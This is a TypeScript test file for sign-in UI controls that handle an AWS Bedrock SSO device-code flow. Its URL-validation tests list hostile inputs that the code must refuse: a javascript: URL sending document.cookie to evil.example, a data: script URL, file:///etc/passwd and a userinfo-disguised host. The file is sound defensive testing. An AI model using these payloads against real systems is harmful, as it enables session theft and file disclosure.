// Truth-table and flow tests for the Bedrock SSO UI controls (#425).

import { describe, expect, it, vi } from 'vitest';
import {
  copyBedrockUserCode,
  getBedrockAuthUiState,
  runBedrockDeviceAuth,
  runBedrockSignOut,
  openExternalUrl,
  type BedrockDevicePrompt,
} from '../../ui/bedrock-auth-controls';

describe('getBedrockAuthUiState', () => {
  it('busy hides everything', () => {
    expect(getBedrockAuthUiState({ isBusy: true, isSignedIn: true })).toEqual({ showLogin: false, showSignOut: false });
    expect(getBedrockAuthUiState({ isBusy: true, isSignedIn: false })).toEqual({ showLogin: false, showSignOut: false });
  });

  it('signed-in shows only sign-out', () => {
    expect(getBedrockAuthUiState({ isBusy: false, isSignedIn: true })).toEqual({ showLogin: false, showSignOut: true });
  });

  it('signed-out shows only login', () => {
    expect(getBedrockAuthUiState({ isBusy: false, isSignedIn: false })).toEqual({ showLogin: true, showSignOut: false });
  });
});

describe('runBedrockDeviceAuth', () => {
  function baseInput() {
    return {
      showError: vi.fn(),
      setBusy: vi.fn(),
      setReady: vi.fn(),
      render: vi.fn(),
      openExternal: vi.fn().mockResolvedValue(undefined),
      setPrompt: vi.fn(),
      beginLogin: vi.fn(),
    };
  }

  function makePrompt(): BedrockDevicePrompt {
    return { userCode: 'ABCD-EFGH', verificationUri: 'https://v', verificationUriComplete: 'https://v?user_code=ABCD-EFGH', complete: Promise.resolve(), cancel: vi.fn() };
  }

  it('opens the verificationUriComplete (code pre-filled) and clears the prompt on success', async () => {
    const input = baseInput();
    const prompt = makePrompt();
    input.beginLogin = vi.fn().mockResolvedValue(prompt);
    await runBedrockDeviceAuth({ ...input, beginLogin: input.beginLogin });
    expect(input.openExternal).toHaveBeenCalledWith('https://v?user_code=ABCD-EFGH');
    await prompt.complete;
    expect(input.setPrompt).toHaveBeenLastCalledWith(null);
    expect(input.setBusy).toHaveBeenLastCalledWith(false);
    expect(input.showError).not.toHaveBeenCalled();
  });

  it('falls back to verificationUri when no complete URL exists', async () => {
    const input = baseInput();
    const { verificationUriComplete: _omit, ...partial } = makePrompt();
    input.beginLogin = vi.fn().mockResolvedValue(partial);
    await runBedrockDeviceAuth({ ...input, beginLogin: input.beginLogin });
    expect(input.openExternal).toHaveBeenCalledWith('https://v');
  });

  it('cancels a zombie poll when opening the browser fails, and stays silent on AbortError', async () => {
    const input = baseInput();
    const prompt = makePrompt();
    input.openExternal = vi.fn().mockRejectedValue(new Error('no browser'));
    input.beginLogin = vi.fn().mockResolvedValue(prompt);
    await runBedrockDeviceAuth({ ...input, beginLogin: input.beginLogin });
    expect(prompt.cancel).toHaveBeenCalled();
    expect(input.showError).toHaveBeenCalledTimes(1);

    const aborting = baseInput();
    aborting.beginLogin = vi.fn().mockRejectedValue(new DOMException('Aborted', 'AbortError'));
    await runBedrockDeviceAuth({ ...aborting, beginLogin: aborting.beginLogin });
    expect(aborting.showError).not.toHaveBeenCalled();
  });
});

describe('copy + sign-out delegation', () => {
  it('copies the user code through the clipboard port', async () => {
    const clipboard = { writeText: vi.fn().mockResolvedValue(undefined) };
    await copyBedrockUserCode('ABCD-EFGH', clipboard);
    expect(clipboard.writeText).toHaveBeenCalledWith('ABCD-EFGH');
  });

  it('sign-out: busy lock, confirm gate, error path', async () => {
    const calls: string[] = [];
    await runBedrockSignOut({
      isBusy: () => false,
      isSignedIn: () => false,
      confirm: async () => { calls.push('confirm'); return true; },
      signOut: async () => { calls.push('signOut'); },
      showError: vi.fn(),
      setBusy: vi.fn(),
      setReady: vi.fn(),
      render: vi.fn(),
    });
    expect(calls).toEqual(['confirm', 'signOut']);
  });
});

/**
 * `openExternalUrl` is handed `verificationUriComplete` — a field lifted
 * straight out of an OIDC response body — and passes it to `window.open`.
 * An unvalidated remote string there turns a sign-in button into arbitrary
 * navigation, so the two rules that stand between the two are pinned here.
 */
describe('openExternalUrl', () => {
  function target() {
    return { open: vi.fn<(url: string, target: string, features: string) => unknown>() };
  }

  it('opens an https URL with noopener,noreferrer', () => {
    const win = target();

    openExternalUrl(win, 'https://device.sso.us-east-1.amazonaws.com/?user_code=ABCD-EFGH');

    // `noopener` is not cosmetic: without it the opened page gets a live
    // `window.opener` handle back into the Obsidian renderer.
    expect(win.open).toHaveBeenCalledWith(
      'https://device.sso.us-east-1.amazonaws.com/?user_code=ABCD-EFGH',
      '_blank',
      'noopener,noreferrer',
    );
  });

  // A tenant's Identity Center start domain is a legitimate device page and
  // is deliberately NOT on the egress allowlist, so the check must not be a
  // host allowlist — it would break the sign-in it protects.
  it('opens a tenant start-domain device page', () => {
    const win = target();

    openExternalUrl(win, 'https://d-1234567890.awsapps.com/start/#/device');

    expect(win.open).toHaveBeenCalledTimes(1);
  });

  it.each([
    ['javascript:', 'javascript:fetch("https://evil.example/"+document.cookie)'],
    ['data:', 'data:text/html,<script>alert(1)</script>'],
    ['file:', 'file:///etc/passwd'],
    ['cleartext http:', 'http://device.sso.us-east-1.amazonaws.com/'],
  ])('refuses a %s URL', (_label, url) => {
    const win = target();

    expect(() => openExternalUrl(win, url)).toThrow(/Refusing to open/);
    expect(win.open).not.toHaveBeenCalled();
  });

  it('refuses a URL that disguises its host with userinfo', () => {
    const win = target();

    expect(() => openExternalUrl(win, 'https://device.sso.us-east-1.amazonaws.com@evil.example/'))
      .toThrow(/credentials/);
    expect(win.open).not.toHaveBeenCalled();
  });

  it('refuses a URL it cannot parse', () => {
    const win = target();

    expect(() => openExternalUrl(win, 'not a url')).toThrow(/could not be parsed/);
    expect(win.open).not.toHaveBeenCalled();
  });

  // The device flow treats an openExternal throw as a failed login: it
  // cancels the prompt and surfaces the message rather than hanging.
  it('surfaces through runBedrockDeviceAuth as a failed login', async () => {
    const win = target();
    const cancel = vi.fn();
    const showError = vi.fn();
    await runBedrockDeviceAuth({
      beginLogin: async () => ({
        userCode: 'ABCD-EFGH',
        verificationUri: 'https://v',
        verificationUriComplete: 'javascript:alert(1)',
        complete: Promise.resolve('done'),
        cancel,
      }) as unknown as BedrockDevicePrompt,
      openExternal: (url) => { openExternalUrl(win, url); },
      setPrompt: vi.fn(),
      showError,
      setBusy: vi.fn(),
      setReady: vi.fn(),
      render: vi.fn(),
    });

    expect(win.open).not.toHaveBeenCalled();
    expect(cancel).toHaveBeenCalledTimes(1);
    expect(showError).toHaveBeenCalledTimes(1);
  });
});
